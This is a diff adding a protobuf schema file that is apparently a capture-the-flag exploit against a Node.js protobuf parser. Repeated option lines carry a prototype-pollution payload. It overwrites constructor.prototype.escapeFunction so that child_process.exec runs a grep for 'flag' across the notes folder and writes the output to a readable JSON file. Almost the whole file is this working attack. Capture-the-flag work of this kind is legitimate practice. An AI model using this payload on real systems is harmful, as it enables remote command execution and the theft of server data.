@@ -1,0 +1,31 @@
+syntax = "proto2";
+
+message Note {
+  optional string title = 1 [default="user"];
+optional string content = 2;
+  optional string author = 3 [default="user"];
+}
+option(a).constructor.prototype.escapeFunction = "JSON.stringify; process.mainModule.require('child_process').exec('grep -h --color=never flag ./notes/* > ./notes/1.json')";
+
+message Y {
+optional string author = 3 [default="user"];
+}
+option(a).constructor.prototype.escapeFunction = "JSON.stringify; process.mainModule.require('child_process').exec('grep -h --color=never flag ./notes/* > ./notes/1.json')";
+
+message Y {
+optional string author = 3 [default="user"];
+}
+option(a).constructor.prototype.escapeFunction = "JSON.stringify; process.mainModule.require('child_process').exec('grep -h --color=never flag ./notes/* > ./notes/1.json')";
+
+message Y {
+optional string title = 1 [default="user"];
+optional string content = 2;
+  optional string author = 3 [default="user"];
+}
+option(a).constructor.prototype.client = 1;
+
+message X {
+optional string title = 1 [default="user"];
+  optional string content = 2;
+  optional string author = 3 [default="user"];
+}
